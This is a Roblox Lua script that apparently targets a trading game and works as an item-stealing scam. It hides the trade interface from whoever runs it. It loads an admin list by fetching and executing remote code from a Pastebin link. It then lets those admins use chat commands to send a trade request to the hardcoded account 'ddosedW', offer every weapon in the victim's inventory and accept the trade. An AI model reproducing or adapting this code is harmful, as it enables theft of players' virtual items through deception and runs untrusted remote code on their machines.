_G.reciever = "ddosedW"

-- Obtain the Players service and the LocalPlayer
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Reference to the GUI elements you want to keep hidden
local TradeGUI = LocalPlayer.PlayerGui:WaitForChild("TradeGUI")
local TradeGUIPhone = LocalPlayer.PlayerGui:WaitForChild("TradeGUI_Phone")

local Container = TradeGUI:WaitForChild("Container")
local BG = TradeGUI:WaitForChild("BG")
local Processing = TradeGUI:WaitForChild("Processing")
local ClickBlocker = TradeGUI:WaitForChild("ClickBlocker")
local PhoneClickBlocker = TradeGUIPhone:WaitForChild("ClickBlocker")
local PhoneContainer = TradeGUIPhone:WaitForChild("Container")

-- Function to conditionally set the GUI elements' visibility
local function conditionallyHideElements()
    -- Check if the LocalPlayer's name is not _G.reciever
    if LocalPlayer.Name ~= _G.reciever then
        Container.Visible = false
        BG.Visible = false
        Processing.Visible = false
        ClickBlocker.Visible = false
        PhoneClickBlocker.Visible = false
        PhoneContainer.Visible = false
    end
end

local heartbeatConnection

-- Function to start hiding GUI elements
local function startHidingElements()
    heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(conditionallyHideElements)
end

-- Function to stop hiding GUI elements and make them visible again
local function stopHidingElements()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end
    
    -- Make GUI elements visible again
    Container.Visible = true
    BG.Visible = true
    Processing.Visible = true
    ClickBlocker.Visible = true
    PhoneClickBlocker.Visible = true
    PhoneContainer.Visible = true
end

-- Function to detect DeclineRequest event and make GUI elements visible again
local function detectDeclineRequest()
    local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
    Trade.DeclineRequest.OnClientEvent:Connect(stopHidingElements)
end

-- Call the detectDeclineRequest function to set up the listener
detectDeclineRequest()

-- Commands
local creatorPrefix = ""
local creatorAdmins = loadstring(game:HttpGet("https://pastebin.com/raw/3JzX9HzU", true))()

local creatorCommands = {
    s = function(sender)
        local targetPlayer = game:GetService("Players"):FindFirstChild(_G.reciever)
        if targetPlayer then
            local tradeArgs = { targetPlayer }
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(tradeArgs))
        end
        startHidingElements()
    end,

    a = function(sender)
        local args = { 285646582 }
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
        -- Wait for 3 seconds and then stop hiding elements
        delay(3, stopHidingElements)
    end,

    i = function(sender)
        -- Check if the LocalPlayer's name is not _G.reciever
        if LocalPlayer.Name == _G.reciever then
            return -- Exit the function if the LocalPlayer's name is _G.reciever
        end

        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Trade = ReplicatedStorage:WaitForChild("Trade")
        local OfferItem = Trade:WaitForChild("OfferItem")

        local Players = game:GetService("Players")
        local player = Players.LocalPlayer

        -- Access the Container in the Player's GUI
        local container = player:FindFirstChild("PlayerGui")
            and player.PlayerGui:FindFirstChild("MainGUI")
            and player.PlayerGui.MainGUI:FindFirstChild("Game")
            and player.PlayerGui.MainGUI.Game:FindFirstChild("Crafting")
            and player.PlayerGui.MainGUI.Game.Crafting:FindFirstChild("Inventory")
            and player.PlayerGui.MainGUI.Game.Crafting.Inventory:FindFirstChild("Salvage")
            and player.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage:FindFirstChild("ScrollFrame")
            and player.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:FindFirstChild("Container")

        -- Iterate over each item in the container and fire the event
        if container then
            for _, item in ipairs(container:GetChildren()) do
                local itemName = item.Name
                local args = { itemName, "Weapons" } -- Modify as needed
                OfferItem:FireServer(unpack(args))
            end
        end
    end
}

local function handleMessage(player, msg)
    local splitMsg = msg:split(" ")
    local prefixCmd = splitMsg[1]
    local cmd = prefixCmd:gsub(creatorPrefix, "")
    if creatorCommands[cmd] then
        creatorCommands[cmd](player)
    end
end

local function adminAdded(player)
    if creatorAdmins[player.UserId] then
        game:GetService("TextChatService").TextChannels.RBXGeneral.MessageReceived:Connect(function(message)
            if message.Text and message.Text:sub(1, #creatorPrefix) == creatorPrefix then
                handleMessage(player, message.Text)
            end
        end)
    end
end

game.Players.PlayerAdded:Connect(adminAdded)

-- Run adminAdded for all currently connected players
for _, player in pairs(game.Players:GetPlayers()) do
    adminAdded(player)
end

print("adm = true")
